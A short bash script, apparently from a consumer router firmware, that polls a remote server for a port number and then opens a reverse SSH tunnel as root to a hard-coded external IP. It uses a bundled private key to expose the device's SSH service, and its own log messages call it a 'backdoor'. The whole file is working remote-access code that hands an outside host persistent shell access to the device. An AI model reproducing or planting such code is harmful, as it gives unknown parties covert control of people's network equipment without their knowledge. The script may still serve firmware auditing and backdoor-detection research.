#!/bin/bash

routerId=`cat /etc/routerId`

while true;
do
	# port has to be 4 or 5 digits
	port=`curl "http://router.lbsdata.org/getport/$routerId" 2>/dev/null`
	pid=$(ps | grep wifixi | grep ssh | awk '/.+/ {print $1}')
	
	if ([[ "$port" =~ ^[0-9]{4}[0-9]?$ ]] && [[ -z "$pid" ]]); then 
		logger -t "backdoor" "Backdoor port $port acquired. Logging into backdoor server..."
		ssh -R $port:localhost:22 -i /usr/lib/wifixi/id_rsa -N root@122.224.70.237 -y &
	elif ([[ ! "$port" =~ ^[0-9]{4}[0-9]?$ ]] && [[ -n "$pid" ]]); then
		logger -t "backdoor" "Backdoor port has been closed. Killing the backdoor process ..."
		kill $pid
	fi
	
	sleep 30
done
